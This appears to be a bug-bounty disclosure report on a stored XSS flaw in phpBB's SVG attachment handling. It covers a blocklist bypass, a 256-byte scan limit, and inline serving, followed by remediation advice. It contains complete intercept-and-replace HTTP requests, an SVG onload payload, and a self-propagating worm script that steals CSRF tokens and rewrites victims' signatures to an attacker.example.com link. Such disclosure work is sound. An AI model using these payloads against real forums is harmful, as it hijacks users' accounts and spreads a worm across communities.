  "vulnerability_information": "# Title\nStored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)\n\n---\n\n# Description\n\n**Tested Version:** phpBB `4.0.0-a2-dev` (Docker, latest master branch as of March 2026)\n\nphpBB implements a content-scanning check (`phpbb\\files\\filespec_storage::check_content()`) to prevent upload of malicious files. Two critical, independently exploitable flaws exist:\n\n**Flaw 1 — Incomplete Blocklist (`phpbb/files/upload.php`, line 29):**\nThe `$disallowed_content` array does not include SVG-specific XSS vectors:\n```php\nprotected $disallowed_content = array('body', 'head', 'html', 'img', 'plaintext', 'a href', 'pre', 'script', 'table', 'title');\n```\nTags such as `<svg onload=\"\">` and `<animate onbegin=\"\">` are absent, so a valid SVG with an `onload` event passes the check and is stored on disk.\n\n**Flaw 2 — 256-Byte Read Limit (`phpbb/files/filespec_storage.php`, line 364):**\n```php\n$ie_mime_relevant = fread($fp, 256); // Only first 256 bytes are scanned\n```\nPadding any payload (including explicitly blocked tags like `<script>`) beyond the 256-byte boundary completely bypasses validation.\n\n**Delivery Vector — Inline SVG Serving (`phpbb/storage/controller/attachment.php`):**\nUploaded SVG files are served with `Content-Disposition: inline` and `Content-Type: image/svg+xml`, causing the browser to render and execute embedded JavaScript when the attachment link is clicked.\n\n**Non-Default Configuration Note:**\n`.svg` is not in phpBB's default allowed extensions list. An administrator must explicitly permit it. Additionally, SVG must be assigned to a non-image extension group (e.g., \"Documents\") — assigning it to \"Images\" causes `getImageSize()` to reject it silently.\n\n---\n\n# Reproduction Steps\n\n## Setup (Docker — quickstart for triager)\n```bash\ndocker compose up -d\n```\nInstall phpBB at `http://localhost:8080/install`, then in ACP → Extensions → Manage: add `svg` extension, assign to a new group \"SVG Files\", set \"Display Inline\" = **No**.\n\n---\n\n## Part 1: Basic XSS Proof (Burp Suite Bypass)\n\nThe client-side `plupload` restricts `.svg` uploads in the browser. We bypass it by intercepting the upload request with Burp Suite.\n\n**Step-by-step:**\n1. Log in as any registered user.\n2. Start a **New Topic**, add the provided `xss_onload.jpg` (dummy file) via the Attachments panel.\n3. Enable **Burp Suite Intercept** and click \"Add the file\".\n4. Replace the intercepted request body with the following complete request (substituting your own live `Cookie`, `form_token`, and `creation_time` values from the original intercepted request):\n\n```\nPOST /posting.php?mode=post&f=2 HTTP/1.1\nHost: localhost:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFFEaAfSerpQAkd4Q\nx-phpbb-using-plupload: 1\nx-requested-with: XMLHttpRequest\nCookie: ***********************************\nConnection: keep-alive\n\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"name\"\n\ndummy.jpg\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"chunk\"\n\n0\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"chunks\"\n\n1\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"add_file\"\n\nAdd the file\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"creation_time\"\n\nYOUR_CREATION_TIME_HERE\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"form_token\"\n\nYOUR_FORM_TOKEN_HERE\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"real_filename\"\n\nxss_onload.svg\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"fileupload\"; filename=\"xss_onload.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS execution on: ' + document.domain)\">\n  <rect width=\"200\" height=\"200\" fill=\"#00ff00\"/>\n  <text x=\"10\" y=\"100\" fill=\"black\" font-size=\"14\">SVG XSS PoC</text>\n</svg>\n\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q--\n```\n\n5. Click **Forward** and turn Intercept **OFF**.\n6. Back in the browser, write any topic title and click **Submit**.\n7. View the published post and click the `xss_onload.svg` attachment link.\n8. **Result:** `alert('XSS execution on: localhost:8080')` fires in the browser.\n\n---\n\n## Part 2: Weaponized XSS Worm (Self-Propagating)\n\nUses the same Burp bypass but with the `xss-worm.svg` payload, which silently mutates the victim's profile using their own authenticated session.\n\n**Complete ready-to-paste request (substitute your session values):**\n\n```\nPOST /posting.php?mode=post&f=2 HTTP/1.1\nHost: localhost:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryF4vyqZURwpTrUxKo\nx-phpbb-using-plupload: 1\nx-requested-with: XMLHttpRequest\nCookie: ***************************************\nConnection: keep-alive\n\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"name\"\n\ndummy.jpg\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"chunk\"\n\n0\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"chunks\"\n\n1\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"add_file\"\n\nAdd the file\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"creation_time\"\n\nYOUR_CREATION_TIME_HERE\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"form_token\"\n\nYOUR_FORM_TOKEN_HERE\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"real_filename\"\n\nxss-worm.svg\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"fileupload\"; filename=\"xss-worm.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- PADDING BYPASS: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -->\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"init()\">\n  <script><![CDATA[\n    function init() {\n      fetch('/ucp.php?i=ucp_profile&mode=signature')\n        .then(r => r.text())\n        .then(html => {\n          let ft = html.match(/name=\"form_token\"\\s+value=\"([^\"]+)\"/);\n          let ct = html.match(/name=\"creation_time\"\\s+value=\"([^\"]+)\"/);\n          if (ft && ct) {\n            let d = new URLSearchParams();\n            d.append('signature', '[url=http://attacker.example.com]Infected by XSS Worm![/url]');\n            d.append('submit', 'Submit');\n            d.append('creation_time', ct[1]);\n            d.append('form_token', ft[1]);\n            fetch('/ucp.php?i=ucp_profile&mode=signature', {\n              method: 'POST',\n              headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n              body: d.toString()\n            }).then(() => alert('XSS Worm: Signature hijacked!'));\n          }\n        });\n    }\n  ]]></script>\n</svg>\n\n------WebKitFormBoundaryF4vyqZURwpTrUxKo--\n```\n\n**Attack flow:**\n1. Upload `xss-worm.svg` as attacker user (`hacker`).\n2. Log in as a different user (`admin`) in a separate browser session (incognito).\n3. Navigate to the post and click the `xss-worm.svg` attachment link.\n4. **Observed result:** Alert fires: `\"XSS Worm: Signature hijacked!\"`\n5. Navigate to `UCP → Profile → Edit Signature`.\n6. **Observed result:** Admin's signature now reads `[url=http://attacker.example.com]Infected by XSS Worm![/url]` — set silently without any additional interaction.\n\n---\n\n## Part 3: Backend Flaw Proof (No Browser Required)\n\n```bash\nphp poc-svg-xss.php\n```\nOutput proves `check_content()` accepts `<svg onload>`, `<animate onbegin>`, and bypasses the 256-byte limit for `<script>` tags.\n\n---\n\n\n# Attachments\n\n| File | Purpose |\n|------|---------|\n| `docker-compose.yml` | One-command environment setup for triager |\n| `poc-svg-xss.php` | Standalone PHP script proving `check_content()` bypasses |\n| `xss_onload.svg` | Minimal SVG payload — blocklist bypass (`onload`) |\n| `xss-worm.svg` | **Verified** weaponized self-propagating worm payload |\n| `xss_onload.jpg` | Dummy JPG file used for Burp Suite bypass (rename trick) |\n\n---\n\n# Remediation\n\n1. **Remove 256-byte limit:** Scan the full file, not just the first 256 bytes.\n2. **Expand blocklist:** Add `svg`, `animate`, `set`, `foreignObject`, `use`, `onload`, `onbegin` to `$disallowed_content`.\n3. **Force `Content-Disposition: attachment` for SVG:** Never serve SVG files inline — force a download instead of browser rendering.\n\n## Impact\n\n**Stored XSS — Self-Propagating Signature Worm **\n\n**Honest Limitations:**\n- `HttpOnly` cookies prevent `document.cookie` extraction.\n- The `cur_password` field is required to change account credentials via UCP, preventing blind AJAX-based credential takeover.\n\n**Actual Impact :**\nThe XSS fires in the victim's same-origin browser context, allowing the attacker's JS to silently make authenticated requests to any UCP endpoint that does **not** require `cur_password`. The Signature endpoint (`/ucp.php?i=ucp_profile&mode=signature`) is fully writable with CSRF tokens alone.\n\nBy changing the victim's Signature, **every post they have ever made** is instantly updated to embed the attacker's payload link. Any user who views a thread containing the victim's posts is exposed to the payload, which can in turn infect their signature. This creates an exponentially self-propagating XSS worm capable of compromising the entire forum userbase from a single infected post.",
